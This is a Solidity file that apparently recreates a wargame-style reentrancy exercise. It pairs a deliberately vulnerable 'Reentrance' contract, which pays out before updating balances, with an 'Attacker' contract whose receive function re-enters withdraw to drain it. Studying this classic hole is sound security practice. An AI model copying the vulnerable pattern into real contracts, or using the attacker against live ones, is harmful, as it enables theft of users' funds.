// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "hardhat/console.sol";

contract Reentrance {
    using SafeMath for uint256;
    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        console.log(msg.sender);
        console.log(_amount);
        console.log(address(this).balance);
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call.value(_amount)("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract Attacker {
    address targetAddr;

    constructor(address _targetAddr) public payable {
        targetAddr = _targetAddr;
        // donate
        targetAddr.call.value(msg.value)(abi.encodeWithSignature("donate(address)", this));
    }

    function withdraw(uint256 amount) public {
        // withdraw
        (bool success, ) = targetAddr.call(abi.encodeWithSignature("withdraw(uint256)", amount));

        console.log(success);
    }

    receive() external payable {
        console.log("Received!");
        console.log(msg.value);
        msg.sender.call(abi.encodeWithSignature("withdraw(uint256)", msg.value));
    }
}
